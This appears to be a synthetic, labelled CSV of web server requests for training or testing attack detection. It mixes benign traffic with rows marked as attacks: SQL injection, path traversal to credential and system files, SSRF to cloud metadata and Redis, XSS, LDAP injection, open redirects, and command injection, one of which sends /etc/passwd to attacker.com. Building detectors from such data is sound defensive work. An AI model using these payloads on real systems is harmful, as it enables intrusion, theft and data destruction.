timestamp,source_ip,dest_ip,method,host,path,query_string,full_url,user_agent,attack_type,is_attack
2026-04-07T13:45:00.848752,172.16.0.250,10.0.0.41,GET,api.example.com,/api/products,category=electronics&brand=apple&from=2024-01-01,http://api.example.com/api/products?category=electronics&brand=apple&from=2024-01-01,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T13:51:42.838216,192.168.1.96,10.0.0.143,GET,10.0.0.50,/faq,page=1&type=product,https://10.0.0.50/faq?page=1&type=product,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T13:24:58.760704,10.0.0.34,10.0.0.1,GET,webapp.internal,/settings,,http://webapp.internal/settings,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T13:43:19.930161,192.168.1.178,10.0.0.142,GET,shop.example.com,/download/C:\Windows\System32\drivers\etc\hosts,,https://shop.example.com/download/C:\Windows\System32\drivers\etc\hosts,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",path_traversal,1
2026-04-07T13:48:01.522214,192.168.1.136,172.16.0.92,GET,test-app.local,/register,to=2024-12-31,http://test-app.local/register?to=2024-12-31,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T13:23:18.990087,192.168.1.47,192.168.1.106,GET,api.example.com,/css/style.css,lang=en,http://api.example.com/css/style.css?lang=en,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:45:08.470671,10.0.0.213,172.16.0.238,GET,example.com,/help,,http://example.com/help,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T13:25:08.617572,192.168.1.182,172.16.0.234,GET,10.0.0.50,/login,type=product&filter=recent,http://10.0.0.50/login?type=product&filter=recent,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:01:42.120031,172.16.0.116,10.0.0.56,GET,api.example.com,/login,limit=10&type=product,https://api.example.com/login?limit=10&type=product,python-requests/2.31.0,benign,0
2026-04-07T13:26:27.095267,172.16.0.234,172.16.0.245,GET,example.com,/css/style.css,,http://example.com/css/style.css,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:54:33.988277,192.168.1.116,10.0.0.90,GET,10.0.0.50,/news,from=2024-01-01,http://10.0.0.50/news?from=2024-01-01,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T13:56:16.269554,192.168.1.161,10.0.0.140,POST,example.com,/index.html,,https://example.com/index.html,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T13:48:13.604230,10.0.0.174,192.168.1.99,GET,api.example.com,/search,id=' UNION SELECT NULL--,https://api.example.com/search?id=' UNION SELECT NULL--,curl/8.4.0,sql_injection,1
2026-04-07T13:57:36.980572,172.16.0.94,10.0.0.99,GET,admin.example.com,/fetch,src=file%3A%2F%2F%2Fetc%2Fpasswd,http://admin.example.com/fetch?src=file%3A%2F%2F%2Fetc%2Fpasswd,PostmanRuntime/7.35.0,ssrf,1
2026-04-07T13:33:07.024111,10.0.0.166,192.168.1.226,GET,10.0.0.50,/api/users,id=' OR ''=',http://10.0.0.50/api/users?id=' OR ''=',Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,sql_injection,1
2026-04-07T13:54:45.027898,10.0.0.236,172.16.0.220,GET,admin.example.com,/link,dest=javascript%3Aalert%28document.domain%29,http://admin.example.com/link?dest=javascript%3Aalert%28document.domain%29,gobuster/3.6,open_redirect,1
2026-04-07T13:33:51.615823,10.0.0.71,192.168.1.197,GET,api.example.com,/js/main.js,,https://api.example.com/js/main.js,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T14:06:58.352755,172.16.0.37,192.168.1.10,HEAD,example.com,/news,page=1&q=laptop,http://example.com/news?page=1&q=laptop,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:30:43.067594,192.168.1.251,192.168.1.101,GET,admin.example.com,/download/..\..\..\windows\system32\config\sam,,http://admin.example.com/download/..\..\..\windows\system32\config\sam,dirbuster,path_traversal,1
2026-04-07T13:56:32.610342,192.168.1.117,192.168.1.83,POST,admin.example.com,/api/execute,host=test& net user hacker hacker123 /add,https://admin.example.com/api/execute?host=test& net user hacker hacker123 /add,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",command_injection,1
2026-04-07T13:58:53.630729,10.0.0.32,192.168.1.45,POST,api.example.com,/login,id=123,https://api.example.com/login?id=123,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T13:45:51.255809,10.0.0.245,10.0.0.240,GET,192.168.1.100,/return,return=%2F%2F%2Fevil.com,https://192.168.1.100/return?return=%2F%2F%2Fevil.com,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),open_redirect,1
2026-04-07T14:03:16.569747,10.0.0.107,172.16.0.247,GET,example.com,/proxy,uri=http%3A%2F%2Fmetadata.google.internal%2F,https://example.com/proxy?uri=http%3A%2F%2Fmetadata.google.internal%2F,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",ssrf,1
2026-04-07T13:34:15.081082,10.0.0.19,10.0.0.18,GET,secure.example.com,/file,template=../../../proc/self/environ,https://secure.example.com/file?template=../../../proc/self/environ,burpsuite,path_traversal,1
2026-04-07T13:53:04.719915,10.0.0.86,192.168.1.194,GET,10.0.0.50,/blog/post/1,view=list,https://10.0.0.50/blog/post/1?view=list,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:02:50.535474,172.16.0.65,192.168.1.43,POST,api.example.com,/help,,http://api.example.com/help,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T13:59:16.583201,172.16.0.116,10.0.0.86,POST,secure.example.com,/search,status=active,http://secure.example.com/search?status=active,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T13:30:45.908475,10.0.0.108,192.168.1.117,GET,example.com,/download/....//....//....//var/www/html/config.php,,http://example.com/download/....//....//....//var/www/html/config.php,Nmap Scripting Engine,path_traversal,1
2026-04-07T13:31:00.972236,10.0.0.89,172.16.0.151,POST,webapp.internal,/register,,http://webapp.internal/register,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:58:12.131219,172.16.0.186,10.0.0.146,HEAD,secure.example.com,/faq,,https://secure.example.com/faq,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T13:34:56.923091,10.0.0.49,172.16.0.224,GET,secure.example.com,/news,,https://secure.example.com/news,python-requests/2.31.0,benign,0
2026-04-07T13:54:54.054797,10.0.0.138,172.16.0.188,GET,admin.example.com,/blog/category/tech,page=1,https://admin.example.com/blog/category/tech?page=1,python-requests/2.31.0,benign,0
2026-04-07T14:07:27.911739,192.168.1.65,10.0.0.205,GET,api.example.com,/load,target=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,https://api.example.com/load?target=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),ssrf,1
2026-04-07T14:05:52.102784,10.0.0.60,192.168.1.132,GET,admin.example.com,/api/fetch,src=http%3A%2F%2F192.168.1.1%2F,https://admin.example.com/api/fetch?src=http%3A%2F%2F192.168.1.1%2F,gobuster/3.6,ssrf,1
2026-04-07T13:40:16.146306,10.0.0.95,192.168.1.123,GET,192.168.1.100,/download/..%c0%af..%c0%af..%c0%afetc/passwd,,http://192.168.1.100/download/..%c0%af..%c0%af..%c0%afetc/passwd,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",path_traversal,1
2026-04-07T13:57:27.640778,10.0.0.44,192.168.1.60,HEAD,webapp.internal,/register,,https://webapp.internal/register,PostmanRuntime/7.35.0,benign,0
2026-04-07T13:59:36.926524,10.0.0.52,172.16.0.154,GET,test-app.local,/blog/category/tech,,https://test-app.local/blog/category/tech,python-requests/2.31.0,benign,0
2026-04-07T13:46:58.815374,10.0.0.135,172.16.0.94,GET,admin.example.com,/admin/run,command=test$(sleep 10),http://admin.example.com/admin/run?command=test$(sleep 10),"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",command_injection,1
2026-04-07T14:01:09.675534,192.168.1.219,192.168.1.76,GET,example.com,/css/style.css,,https://example.com/css/style.css,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:53:19.004954,172.16.0.247,172.16.0.175,GET,secure.example.com,/contact,,https://secure.example.com/contact,python-requests/2.31.0,benign,0
2026-04-07T13:45:33.022795,172.16.0.71,10.0.0.231,GET,10.0.0.50,/lookup,run=test; curl http://attacker.com/exfil?data=$(cat /etc/passwd),http://10.0.0.50/lookup?run=test; curl http://attacker.com/exfil?data=$(cat /etc/passwd),Nmap Scripting Engine,command_injection,1
2026-04-07T13:44:49.988605,10.0.0.198,192.168.1.92,GET,test-app.local,/products,status=active,http://test-app.local/products?status=active,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T13:24:57.487405,192.168.1.92,10.0.0.218,GET,shop.example.com,/api/v1/status,,http://shop.example.com/api/v1/status,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:48:17.409546,192.168.1.233,10.0.0.136,GET,10.0.0.50,/download/../../../etc/passwd,,http://10.0.0.50/download/../../../etc/passwd,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",path_traversal,1
2026-04-07T13:28:40.580332,10.0.0.175,192.168.1.88,POST,example.com,/feedback,comment=<img src=1 onerror=alert(1)>,http://example.com/feedback?comment=<img src=1 onerror=alert(1)>,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),xss,1
2026-04-07T14:08:14.607261,172.16.0.99,192.168.1.38,GET,10.0.0.50,/blog,lang=en&id=123&view=list,http://10.0.0.50/blog?lang=en&id=123&view=list,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T14:06:45.433781,10.0.0.11,10.0.0.171,GET,example.com,/fetch,src=gopher%3A%2F%2Flocalhost%3A6379%2F_%2A1%250d%250a%248%250d%250aflushall%250d%250a,http://example.com/fetch?src=gopher%3A%2F%2Flocalhost%3A6379%2F_%2A1%250d%250a%248%250d%250aflushall%250d%250a,gobuster/3.6,ssrf,1
2026-04-07T13:43:25.879328,192.168.1.98,172.16.0.156,GET,example.com,/download,page=..0x2f..0x2f..0x2fetc/passwd,http://example.com/download?page=..0x2f..0x2f..0x2fetc/passwd,python-requests/2.31.0,path_traversal,1
2026-04-07T13:54:46.829047,10.0.0.28,172.16.0.99,POST,api.example.com,/api/message,query=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,https://api.example.com/api/message?query=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,wfuzz/3.1.0,xss,1
2026-04-07T13:54:29.537902,10.0.0.132,10.0.0.55,GET,admin.example.com,/download,template=../../../proc/self/environ,http://admin.example.com/download?template=../../../proc/self/environ,wfuzz/3.1.0,path_traversal,1
2026-04-07T14:02:06.243989,10.0.0.198,10.0.0.98,GET,secure.example.com,/comment,search=%3Csvg%2Fonload%3Dalert%28%27XSS%27%29%3E,http://secure.example.com/comment?search=%3Csvg%2Fonload%3Dalert%28%27XSS%27%29%3E,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",xss,1
2026-04-07T14:06:00.869620,192.168.1.13,10.0.0.171,POST,192.168.1.100,/api/users,category=%27%20OR%20%27a%27%3D%27a,https://192.168.1.100/api/users?category=%27%20OR%20%27a%27%3D%27a,Nmap Scripting Engine,sql_injection,1
2026-04-07T13:33:03.942756,10.0.0.158,10.0.0.19,GET,10.0.0.50,/search,,http://10.0.0.50/search,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:43:32.302003,10.0.0.248,10.0.0.66,GET,admin.example.com,/link,goto=%2F%5Cevil.com,http://admin.example.com/link?goto=%2F%5Cevil.com,sqlmap/1.7.12#dev,open_redirect,1
2026-04-07T13:26:34.436423,172.16.0.35,192.168.1.218,GET,test-app.local,/search,cn=admin%2A,http://test-app.local/search?cn=admin%2A,burpsuite,ldap_injection,1
2026-04-07T13:37:17.768348,192.168.1.215,10.0.0.101,GET,shop.example.com,/admin,q='; EXEC xp_cmdshell('dir')--,https://shop.example.com/admin?q='; EXEC xp_cmdshell('dir')--,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",sql_injection,1
2026-04-07T14:03:41.953079,172.16.0.64,192.168.1.177,HEAD,shop.example.com,/terms,,https://shop.example.com/terms,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T13:35:35.222660,10.0.0.63,10.0.0.114,GET,test-app.local,/images/logo.png,status=active,https://test-app.local/images/logo.png?status=active,python-requests/2.31.0,benign,0
2026-04-07T13:43:09.543511,10.0.0.186,192.168.1.209,GET,example.com,/lookup,username=%2A%29%28objectClass%3D%2A,https://example.com/lookup?username=%2A%29%28objectClass%3D%2A,curl/8.4.0,ldap_injection,1
2026-04-07T14:00:10.429782,192.168.1.2,172.16.0.51,GET,192.168.1.100,/settings,page=1,http://192.168.1.100/settings?page=1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T13:36:41.846671,172.16.0.44,10.0.0.135,GET,shop.example.com,/fetch,dest=http%3A%2F%2Fmetadata.google.internal%2F,https://shop.example.com/fetch?dest=http%3A%2F%2Fmetadata.google.internal%2F,gobuster/3.6,ssrf,1
2026-04-07T13:21:56.994953,172.16.0.234,192.168.1.98,GET,shop.example.com,/view,page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,https://shop.example.com/view?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),path_traversal,1
2026-04-07T13:35:54.352754,192.168.1.3,172.16.0.69,GET,shop.example.com,/api/user,cn=%2A%29%28objectClass%3D%2A,http://shop.example.com/api/user?cn=%2A%29%28objectClass%3D%2A,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",ldap_injection,1
2026-04-07T13:43:45.813975,192.168.1.72,172.16.0.237,HEAD,webapp.internal,/terms,,http://webapp.internal/terms,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T13:48:42.520243,172.16.0.174,192.168.1.124,GET,admin.example.com,/css/style.css,order=name,https://admin.example.com/css/style.css?order=name,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T14:06:06.435341,172.16.0.174,172.16.0.227,GET,test-app.local,/privacy,id=123&order=name,https://test-app.local/privacy?id=123&order=name,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T13:26:59.439079,10.0.0.138,172.16.0.57,POST,admin.example.com,/events,limit=10,https://admin.example.com/events?limit=10,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T13:57:00.424989,10.0.0.245,192.168.1.154,GET,secure.example.com,/image,src=gopher%3A%2F%2Flocalhost%3A6379%2F_%2A1%250d%250a%248%250d%250aflushall%250d%250a,http://secure.example.com/image?src=gopher%3A%2F%2Flocalhost%3A6379%2F_%2A1%250d%250a%248%250d%250aflushall%250d%250a,ZAP/2.14.0,ssrf,1
2026-04-07T14:05:37.566280,192.168.1.213,172.16.0.235,GET,secure.example.com,/logout,from=2024-01-01,http://secure.example.com/logout?from=2024-01-01,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:48:16.318303,192.168.1.191,172.16.0.184,GET,api.example.com,/api/user,filter=x%27%20or%20name%28%29%3D%27username%27%20or%20%27x%27%3D%27y,http://api.example.com/api/user?filter=x%27%20or%20name%28%29%3D%27username%27%20or%20%27x%27%3D%27y,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",ldap_injection,1
2026-04-07T14:01:01.516199,10.0.0.27,10.0.0.178,GET,test-app.local,/feedback,search=%3Cvideo%3E%3Csource%20onerror%3D%22alert%281%29%22%3E,http://test-app.local/feedback?search=%3Cvideo%3E%3Csource%20onerror%3D%22alert%281%29%22%3E,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",xss,1
2026-04-07T14:00:35.686561,172.16.0.51,10.0.0.68,GET,shop.example.com,/redir,target=%2F%5Cevil.com,https://shop.example.com/redir?target=%2F%5Cevil.com,curl/8.4.0,open_redirect,1
2026-04-07T14:00:39.105324,192.168.1.117,192.168.1.228,POST,test-app.local,/terms,type=product&category=electronics,http://test-app.local/terms?type=product&category=electronics,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T13:39:50.525193,172.16.0.146,10.0.0.60,GET,192.168.1.100,/,limit=10&user=john,http://192.168.1.100/?limit=10&user=john,PostmanRuntime/7.35.0,benign,0
2026-04-07T13:40:35.285452,172.16.0.144,172.16.0.186,GET,example.com,/checkout,limit=10&q=laptop&status=active,http://example.com/checkout?limit=10&q=laptop&status=active,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:43:11.521405,172.16.0.125,172.16.0.69,POST,webapp.internal,/api/message,"q=<math><maction actiontype=""statusline#http://attacker.com"">","https://webapp.internal/api/message?q=<math><maction actiontype=""statusline#http://attacker.com"">","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",xss,1
2026-04-07T13:25:47.997945,192.168.1.33,172.16.0.207,POST,api.example.com,/index.html,from=2024-01-01&q=laptop&view=list,http://api.example.com/index.html?from=2024-01-01&q=laptop&view=list,python-requests/2.31.0,benign,0
2026-04-07T13:59:49.539242,192.168.1.94,192.168.1.21,GET,webapp.internal,/api/users,user=%27%20OR%20%271%27%3D%271%27%20%2F%2A,https://webapp.internal/api/users?user=%27%20OR%20%271%27%3D%271%27%20%2F%2A,python-requests/2.31.0,sql_injection,1
2026-04-07T13:37:20.853450,172.16.0.252,10.0.0.112,GET,192.168.1.100,/read,template=../../../var/log/auth.log,https://192.168.1.100/read?template=../../../var/log/auth.log,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,path_traversal,1
2026-04-07T13:39:02.194590,172.16.0.182,192.168.1.63,POST,shop.example.com,/about,,http://shop.example.com/about,python-requests/2.31.0,benign,0
2026-04-07T13:59:19.691516,10.0.0.162,172.16.0.46,GET,shop.example.com,/search,,https://shop.example.com/search,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:21:33.533630,10.0.0.99,172.16.0.124,HEAD,test-app.local,/css/style.css,,http://test-app.local/css/style.css,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T13:43:09.005270,192.168.1.1,172.16.0.174,GET,10.0.0.50,/terms,,http://10.0.0.50/terms,PostmanRuntime/7.35.0,benign,0
2026-04-07T13:29:39.910806,172.16.0.19,10.0.0.72,GET,192.168.1.100,/search,query=admin%29%28%26%29,https://192.168.1.100/search?query=admin%29%28%26%29,curl/8.4.0,ldap_injection,1
2026-04-07T13:28:54.382014,172.16.0.49,192.168.1.83,GET,shop.example.com,/contact,lang=en&from=2024-01-01,http://shop.example.com/contact?lang=en&from=2024-01-01,PostmanRuntime/7.35.0,benign,0
2026-04-07T14:09:45.874642,192.168.1.153,172.16.0.66,HEAD,shop.example.com,/api/v1/status,,http://shop.example.com/api/v1/status,curl/8.4.0,benign,0
2026-04-07T13:48:35.650408,10.0.0.140,10.0.0.147,GET,192.168.1.100,/redir,return=javascript%3Aalert%28document.domain%29,https://192.168.1.100/redir?return=javascript%3Aalert%28document.domain%29,dirbuster,open_redirect,1
2026-04-07T13:49:34.170559,10.0.0.56,192.168.1.200,POST,admin.example.com,/api/v1/health,,https://admin.example.com/api/v1/health,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:27:28.500933,172.16.0.121,172.16.0.151,GET,webapp.internal,/exec,cmd=test; echo vulnerable,http://webapp.internal/exec?cmd=test; echo vulnerable,nikto/2.5.0,command_injection,1
2026-04-07T13:36:03.079361,192.168.1.232,192.168.1.82,HEAD,shop.example.com,/blog/category/tech,to=2024-12-31&lang=en&view=list,http://shop.example.com/blog/category/tech?to=2024-12-31&lang=en&view=list,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:56:06.672863,10.0.0.73,172.16.0.139,POST,admin.example.com,/api/v1/health,brand=apple,http://admin.example.com/api/v1/health?brand=apple,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:31:46.855487,192.168.1.61,172.16.0.36,GET,webapp.internal,/api/v2/data,,http://webapp.internal/api/v2/data,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:53:11.733578,192.168.1.102,172.16.0.99,POST,test-app.local,/api/products,from=2024-01-01&lang=en&page=1,http://test-app.local/api/products?from=2024-01-01&lang=en&page=1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:57:41.543450,192.168.1.15,172.16.0.152,GET,shop.example.com,/load,src=http%3A%2F%2F0.0.0.0%2F,https://shop.example.com/load?src=http%3A%2F%2F0.0.0.0%2F,sqlmap/1.7.12#dev,ssrf,1
2026-04-07T13:56:46.649643,10.0.0.223,10.0.0.239,GET,api.example.com,/js/main.js,,https://api.example.com/js/main.js,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T13:49:17.938666,192.168.1.175,192.168.1.145,GET,shop.example.com,/blog/post/1,,http://shop.example.com/blog/post/1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T13:28:28.669889,172.16.0.149,10.0.0.55,POST,api.example.com,/register,order=name&status=active&view=list,http://api.example.com/register?order=name&status=active&view=list,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T13:40:13.089369,172.16.0.46,172.16.0.227,GET,secure.example.com,/dashboard,page=1,http://secure.example.com/dashboard?page=1,PostmanRuntime/7.35.0,benign,0
2026-04-07T13:36:20.127554,10.0.0.73,192.168.1.157,GET,webapp.internal,/api/users,q=laptop,http://webapp.internal/api/users?q=laptop,python-requests/2.31.0,benign,0
2026-04-07T13:39:53.077026,192.168.1.244,10.0.0.47,GET,webapp.internal,/goto,redirect=javascript%3Aalert%28document.domain%29,https://webapp.internal/goto?redirect=javascript%3Aalert%28document.domain%29,nikto/2.5.0,open_redirect,1
2026-04-07T13:45:59.487873,192.168.1.102,192.168.1.246,GET,10.0.0.50,/api/products,sort=asc,http://10.0.0.50/api/products?sort=asc,python-requests/2.31.0,benign,0
